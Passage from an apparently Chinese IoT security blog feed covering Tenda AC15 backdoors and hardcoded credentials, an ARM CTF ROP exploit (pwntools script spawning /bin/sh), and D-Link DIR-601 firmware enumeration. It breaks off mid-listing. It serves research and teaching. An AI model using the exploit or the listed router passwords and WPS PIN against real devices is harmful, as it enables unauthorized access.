src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240829101555402.png" alt="image-20240829101555402"></p><p>管理员账号。设备的管理员账号默认为“admin”，而密码同样也是“admin”。</p><h4 id="后门二"><a href="#后门二" class="headerlink" title="后门二"></a>后门二</h4><p>搜索WPS字符串</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240829101715277.png" alt="image-20240829101715277"></p><p>WPS系统的PIN为<em>28296607</em>，任何人用PIN都连接到你的无线网络</p><h4 id="后门三"><a href="#后门三" class="headerlink" title="后门三"></a>后门三</h4><p>&#x2F;etc&#x2F;shadow中保存了root用户默认密码</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240829102037532.png" alt="image-20240829102037532"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240829102603291.png" alt="image-20240829102603291"></p><p>用john解出来是root:1234</p><h4 id="fotad硬编码"><a href="#fotad硬编码" class="headerlink" title="fotad硬编码"></a>fotad硬编码</h4><p>路由器与 FOTA 服务器进行通信时的凭证数据硬编码在 <code>/sbin/fotad</code> 代码中</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">FOTA</span> 是 <span class="hljs-variable">Firmware</span> <span class="hljs-built_in">Over</span><span class="hljs-operator">-</span><span class="hljs-variable">The</span><span class="hljs-operator">-</span><span class="hljs-variable">Air</span> 的缩写，指的是 空中固件升级。<span class="hljs-variable">FOTA</span> 服务器就是提供固件升级服务的服务器。<br></code></pre></td></tr></table></figure><p>漏洞存在于fotad的sub_CAAC函数中</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240829104644262.png" alt="image-20240829104644262"></p><p>用户&#x2F;密码如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cWRwYzpxZHBj        qdpc:qdpc<br>cWRwZTpxZHBl        qdpe:qdpe<br><span class="hljs-attribute">cWRwOnFkcA</span>==        qdp:qdp<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>一道ARM_PWN题浅析符号表恢复</title>
    <link href="/2024/08/01/%E4%B8%80%E9%81%93ARM-PWN%E9%A2%98%E6%B5%85%E6%9E%90%E7%AC%A6%E5%8F%B7%E8%A1%A8%E6%81%A2%E5%A4%8D/"/>
    <url>/2024/08/01/%E4%B8%80%E9%81%93ARM-PWN%E9%A2%98%E6%B5%85%E6%9E%90%E7%AC%A6%E5%8F%B7%E8%A1%A8%E6%81%A2%E5%A4%8D/</url>
    
    <content type="html"><![CDATA[<p>题目链接：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/arm/jarvisOJ_typo">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/arm/jarvisOJ_typo</a></p><h3 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h3><p>这里使用的是iotsec-Zone靶场</p><p>首先查看文件信息</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%81%A2%E5%A4%8D/image-20240830151951939.png" alt="image-20240830151951939"></p><p>arm小端、静态链接</p><p>尝试模拟</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%81%A2%E5%A4%8D/image-20240830152056291.png" alt="image-20240830152056291"></p><p>首先需要输入enter</p><p>然后是一个类似于打字练习的二进制程序，在下方可以输入</p><p>尝试用cyclic构造足够长的坏字符，并且动态调试</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%81%A2%E5%A4%8D/image-20240830152531399.png" alt="image-20240830152531399"></p><p>可以看到这里发生了溢出，并且在112的位置覆盖了返回地址</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%81%A2%E5%A4%8D/image-20240830152734569.png" alt="image-20240830152734569"></p><p><strong>ROP构造</strong></p><p>ida打开typo二进制文件</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%81%A2%E5%A4%8D/ae5ba4c1ae612c82adbd9ae9f4b0bba.png" alt="ae5ba4c1ae612c82adbd9ae9f4b0bba"></p><p>搜索system函数</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%81%A2%E5%A4%8D/f2eb7e500dd8c77cc08ee8408237275.png" alt="f2eb7e500dd8c77cc08ee8408237275"></p><p>二进制typo没有符号表，我们搜索不到system函数，就无法构造ROP链</p><p><strong>恢复符号表</strong></p><p>简单介绍一下三种恢复符号表的方法</p><p><strong>1.Lumina</strong></p><p><strong>Lumina</strong> 服务器目前非常简单：它保存着著名函数的元数据（函数名、原型、注释、操作数类型和其他信息）。任何用户都可以从Lumina发送或接收元数据。</p><p>Hex-rays中文官方网站<a href="http://hex-rays.cn/sub/lumina.html">http://hex-rays.cn/sub/lumina.html</a></p><p><strong>2.Rizzo</strong></p><p>Rizzo使用启发式的函数识别方法，能够比FLIRT识别出更多的函数。同样Rizzo也需要现先有一个和被分析的程序类似的程序。</p><p>Rizzo需要对比文件。</p><p>安装方法：<a href="https://github.com/fuzzywalls/ida">https://github.com/fuzzywalls/ida</a></p><p><strong>3.finger</strong></p><p>阿里公开的函数识别插件，使用了阿里生成的签名库。</p><p>下载地址：<a href="https://github.com/aliyunav/Finger/blob/master/finger_plugin.py">https://github.com/aliyunav/Finger/blob/master/finger_plugin.py</a></p><p><strong>Lumina恢复</strong></p><p>这里尝试使用Lumina服务器恢复符号表，他是ida官方出的一个符号识别服务器</p><p>由于客观原因，我们也可以使用第三方的服务器</p><p>打开ida根目录下cfg文件夹，打开ida.cfg，修改如下两行</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">LUMINA_HOST</span> = <span class="hljs-string">&quot;lumen.abda.nl&quot;</span><span class="hljs-comment">;</span><br><span class="hljs-attr">LUMINA_PORT</span> = <span class="hljs-number">1235</span><br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%81%A2%E5%A4%8D/image-20240830153912367.png" alt="image-20240830153912367"></p><p>然后下载该服务证书放到ida根目录下</p><p><a href="https://abda.nl/lumen/hexrays.crt">https://abda.nl/lumen/hexrays.crt</a></p><p>重启ida后，点击lumina下拉框中的push all metadata，和远程服务器建立连接，然后再push一下。</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%81%A2%E5%A4%8D/image-20240830154101247.png" alt="image-20240830154101247"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%81%A2%E5%A4%8D/image-20240830154219491.png" alt="image-20240830154219491"></p><p>可以看到恢复之后的符号表在function栏中以绿色背景显示</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%81%A2%E5%A4%8D/image-20240830154311796.png" alt="image-20240830154311796"></p><p>搜索system可知<strong>system地址为000110B4</strong></p><p><strong>寻找ROPgadget</strong></p><p>寻找<code>/bin/sh</code>地址</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby">iot<span class="hljs-variable">@research</span><span class="hljs-symbol">:~/gujian</span><span class="hljs-variable">$ </span><span class="hljs-title class_">ROPgadget</span> --binary ./typo --string /bin/sh<br><span class="hljs-title class_">Strings</span> information<br>============================================================<br><span class="hljs-number">0x0006c384</span> : <span class="hljs-regexp">/bin/sh</span><br>iot<span class="hljs-variable">@research</span><span class="hljs-symbol">:~/gujian</span><span class="hljs-variable">$ </span><span class="hljs-title class_">ROPgadget</span> --binary ./typo --only <span class="hljs-string">&quot;pop|ret&quot;</span> |<span class="hljs-params"> grep r0</span><br><span class="hljs-params">0x00020904 : pop &#123;r0, r4, pc&#125;</span><br></code></pre></td></tr></table></figure><p>我们需要找一段gadget，把&#x2F;bin&#x2F;sh的地址作为参数传递给system()函数，放在r0寄存器上。</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%81%A2%E5%A4%8D/image-20240830154440788.png" alt="image-20240830154440788"></p><p><strong>构造payload</strong></p><p>由于只找到了 pop{r0,r4,pc} 的地址</p><p>在pop r0的之后还会pop r4，因此我们在payload的构造上要有8字节的长度</p><p>pop后程序会带着r0—&gt;&#x2F;bin&#x2F;sh 跳转到system()</p><p><strong>exp</strong></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><span class="hljs-built_in">io</span> = remote(<span class="hljs-string">&quot;192.168.2.112&quot;</span>, <span class="hljs-number">42106</span>, timeout = <span class="hljs-number">2</span>)<br>payload = b<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span> + p32(<span class="hljs-number">0x20904</span>) + p32(<span class="hljs-number">0x6c384</span>) * <span class="hljs-number">2</span> + p32(<span class="hljs-number">0x110B4</span>)<br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&quot;quit\n&quot;</span>)<br><span class="hljs-built_in">io</span>.send(<span class="hljs-string">&quot;\n&quot;</span>)<br><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<br><span class="hljs-built_in">io</span>.sendline(payload)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>dir-601漏洞分析</title>
    <link href="/2024/07/29/dir-601%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    <url>/2024/07/29/dir-601%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="dir-601固件分析"><a href="#dir-601固件分析" class="headerlink" title="dir-601固件分析"></a>dir-601固件分析</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>固件有些老，但作为初学者有一定的学习参考价值。：）</p><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>固件名：DIR601B1_FW202NAb01.bin</p><ul><li>型号：dir-601</li><li>版本：FW202NAb01</li><li>官网：<a href="https://www.dlink.com/">https://www.DLINK.com/</a></li><li>测试环境：Ubuntu 22.04</li></ul><p>binwalk -Me解包</p><p>进入squashfs文件系统</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728212550443.png" alt="image-20240728212550443"></p><p>firmwalk进行枚举</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs crystal">-------------------- admin --------------------<br><span class="hljs-regexp">/mnt/services</span><br><span class="hljs-regexp">/mnt/nvram</span>.default<br><span class="hljs-regexp">/mnt/shadow</span><br><span class="hljs-regexp">/mnt/passwd</span><br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/hints</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/help</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/lang</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/msg</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/login</span>_real.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/support</span>_men.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/wizard</span>_default.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/st</span>_routing.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/support</span>_tools.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/wizard</span>_wan.htm<br><br>-------------------- root --------------------<br><span class="hljs-regexp">/lib/libip</span>6tc.so.<span class="hljs-number">0.0</span>.<span class="hljs-number">0</span><br><span class="hljs-regexp">/lib/libip</span>4tc.so.<span class="hljs-number">0.0</span>.<span class="hljs-number">0</span><br><span class="hljs-regexp">/lib/pppd</span><span class="hljs-regexp">/2.4.4/rp</span>-pppoe.so<br><span class="hljs-regexp">/lib/libavahi</span>-core.so.<span class="hljs-number">7.0</span>.<span class="hljs-number">2</span><br><span class="hljs-regexp">/sbin/ip</span><br><span class="hljs-regexp">/sbin/igmpproxy</span><br><span class="hljs-regexp">/sbin/tc</span><br><span class="hljs-regexp">/sbin/pppoe</span>-relay<br><span class="hljs-regexp">/sbin/clink</span><br><span class="hljs-regexp">/sbin/dnsmasq</span><br><span class="hljs-regexp">/sbin/avahi</span>-daemon<br><span class="hljs-regexp">/sbin/inadyn</span><br><span class="hljs-regexp">/sbin/miniupnpd</span><br><span class="hljs-regexp">/sbin/pppd</span><br><span class="hljs-regexp">/usr/sbin</span><span class="hljs-regexp">/hostapd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/wan</span>_manager<br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/lighttpd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/my</span>_cgi.cgi<br><span class="hljs-regexp">/mnt/lighttpd</span><span class="hljs-regexp">/lighttpd.conf</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/shadow</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/passwd</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/xml</span><span class="hljs-regexp">/html_info.xml</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/xml</span><span class="hljs-regexp">/hints.xml</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/xml</span><span class="hljs-regexp">/help.xml</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/xml</span><span class="hljs-regexp">/lang.xml</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/xml</span><span class="hljs-regexp">/rule_num.xml</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/xml</span><span class="hljs-regexp">/msg.xml</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/rt</span><span class="hljs-regexp">/tools_admin.htm</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/js</span><span class="hljs-regexp">/public.js</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/group</span><br><span class="hljs-regexp">/bin</span><span class="hljs-regexp">/busybox</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- password --------------------</span><br><span class="hljs-regexp">/lib</span><span class="hljs-regexp">/libuClibc-0.9.30.so</span><br><span class="hljs-regexp">/lib</span><span class="hljs-regexp">/pppd/</span><span class="hljs-number">2.4</span>.<span class="hljs-number">3</span>/openl2tp/ppp_unix.so<br><span class="hljs-regexp">/sbin/msmtp</span><br><span class="hljs-regexp">/sbin/inadyn</span><br><span class="hljs-regexp">/sbin/pppd</span><br><span class="hljs-regexp">/usr/sbin</span><span class="hljs-regexp">/hostapd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/widgetd</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/my_cgi.cgi</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/daemon</span>_manager<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/hints</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/help</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/lang</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/msg</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/wireless</span>.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/tools</span>_email.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/tools</span>_admin.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/login</span>_real.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/tools</span>_ddns.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/wan</span>_pptp.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/wan</span>_l2tp.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/wizard</span>_default.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/wan</span>_poe.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/rt/wizard</span>_wan.htm<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/js/public</span>.js<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/js/jquery</span>-<span class="hljs-number">1.4</span>.<span class="hljs-number">2</span>.min.js<br><span class="hljs-regexp">/mnt/wpa</span>2/hostapd.eap_user<br><span class="hljs-regexp">/bin/busybox</span><br><br>-------------------- passwd --------------------<br><span class="hljs-regexp">/lib/libu</span>Clibc-<span class="hljs-number">0.9</span>.<span class="hljs-number">30</span>.so<br><span class="hljs-regexp">/sbin/msmtp</span><br><span class="hljs-regexp">/sbin/pppd</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/mailosd</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/services</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/nsswitch.conf</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- pwd --------------------</span><br><span class="hljs-regexp">/lib</span><span class="hljs-regexp">/libuClibc-0.9.30.so</span><br><span class="hljs-regexp">/bin</span><span class="hljs-regexp">/busybox</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- dropbear --------------------</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- ssl --------------------</span><br><span class="hljs-regexp">/sbin</span><span class="hljs-regexp">/msmtp</span><br><span class="hljs-regexp">/sbin</span><span class="hljs-regexp">/crowdcontrol</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/lighttpd</span><br><span class="hljs-regexp">/mnt/lighttpd</span><span class="hljs-regexp">/lighttpd.conf</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- private key --------------------</span><br><span class="hljs-regexp">/sbin</span><span class="hljs-regexp">/msmtp</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- telnet --------------------</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/services</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/rt</span><span class="hljs-regexp">/adv_virtual.htm</span><br><span class="hljs-regexp">/bin</span><span class="hljs-regexp">/busybox</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- secret --------------------</span><br><span class="hljs-regexp">/lib</span><span class="hljs-regexp">/libwpa_common.so</span><br><span class="hljs-regexp">/sbin</span><span class="hljs-regexp">/pppd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/lib/libwpa</span>_common.so<br><span class="hljs-regexp">/usr/sbin</span><span class="hljs-regexp">/openl2tpd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/widgetd</span><br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/help</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/xml/lang</span>.xml<br><span class="hljs-regexp">/mnt/www</span><span class="hljs-regexp">/js/object</span>.js<br><br>-------------------- pgp --------------------<br><span class="hljs-regexp">/mnt/lighttpd</span><span class="hljs-regexp">/conf.d/mime</span>.conf<br><br>-------------------- gpg --------------------<br><br>-------------------- token --------------------<br><span class="hljs-regexp">/lib/libexpat</span>.so.<span class="hljs-number">1.5</span>.<span class="hljs-number">2</span><br><span class="hljs-regexp">/sbin/igmpproxy</span><br><span class="hljs-regexp">/sbin/tc</span><br><span class="hljs-regexp">/sbin/pppd</span><br><span class="hljs-regexp">/usr/sbin</span><span class="hljs-regexp">/hostapd</span><br><span class="hljs-regexp">/bin</span><span class="hljs-regexp">/busybox</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- api key --------------------</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- oauth --------------------</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- cmd= --------------------</span><br><span class="hljs-regexp">/lib</span><span class="hljs-regexp">/modules/statistics</span>_module.ko<br><br>-------------------- exec= --------------------<br><br>-------------------- command= --------------------<br><span class="hljs-regexp">/usr/sbin</span><span class="hljs-regexp">/hostapd</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">-------------------- config --------------------</span><br><span class="hljs-regexp">/lib</span><span class="hljs-regexp">/modules/</span><span class="hljs-number">2.6</span>.<span class="hljs-number">31</span>/net/ath_dev.ko<br><span class="hljs-regexp">/lib/libu</span>Clibc-<span class="hljs-number">0.9</span>.<span class="hljs-number">30</span>.so<br><span class="hljs-regexp">/lib/pppd</span><span class="hljs-regexp">/2.4.3/openl</span>2tp/ppp_unix.so<br><span class="hljs-regexp">/sbin/udhcpd</span><br><span class="hljs-regexp">/sbin/ip</span><br><span class="hljs-regexp">/sbin/igmpproxy</span><br><span class="hljs-regexp">/sbin/dnsmasq</span><br><span class="hljs-regexp">/sbin/inadyn</span><br><span class="hljs-regexp">/sbin/miniupnpd</span><br><span class="hljs-regexp">/sbin/pppd</span><br><span class="hljs-regexp">/usr/sbin</span><span class="hljs-regexp">/hostapd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/sbin/wpatalk</span><br><span class="hljs-regexp">/usr/sbin</span><span class="hljs-regexp">/openl2tpd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/lighttpd</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/wlan_manager</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/lighttpd/modules</span>.conf<br><span class="hljs-regexp">/mnt/lighttpd</span><span class="hljs-regexp">/lighttpd.conf</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/xml</span><span class="hljs-regexp">/html_info.xml</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/miniupnpd.conf.old</span><br><span class="hljs-regexp">/bin</span><span class="hljs-regexp">/busybox</span><br><span class="hljs-regexp">-------------------- credentials --------------------</span><br><span class="hljs-regexp">/lib</span><span class="hljs-regexp">/libavahi-core.so.7.0.2</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/www/xml</span><span class="hljs-regexp">/help.xml</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">##################################### lighttpd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/lighttpd</span><br><span class="hljs-regexp">/tmp/log</span><span class="hljs-regexp">/lighttpd</span><br><span class="hljs-regexp">/mnt</span><span class="hljs-regexp">/lighttpd</span><br><span class="hljs-regexp">-------------------- cgi --------------------</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/sbin/my</span>_cgi.cgi<br></code></pre></td></tr></table></figure><p>服务由lighttpd启动</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728214057449.png" alt="image-20240728214057449"></p><p>关键性cgi：my_cgi.cgi</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728214247010.png" alt="image-20240728214247010"></p><p>查找未授权访问页面</p><p>用自己写的脚本enumUnauth 枚举后得到疑似未授权的weblist</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240729113623698.png" alt="image-20240729113623698"></p><p>​github地址：</p><p>​<a href="https://github.com/GroundCTL2MajorTom/enumUnauth">https://github.com/GroundCTL2MajorTom/enumUnauth</a></p><p>用浏览器插件bulk批量访问后得到一个未授权访问的页面<a href="http://192.168.0.1/my_cgi.cgi?0.7543305713163453">http://192.168.0.1/my_cgi.cgi?0.7543305713163453</a></p><img src="image-20240729114058448.png" alt="image-20240729114058448" style="zoom:50%;" /><p>这里可以未授权查看系统信息</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728215127221.png" alt="image-20240728215127221"></p><p><strong>启动项分析</strong></p><p>rcS 文件</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 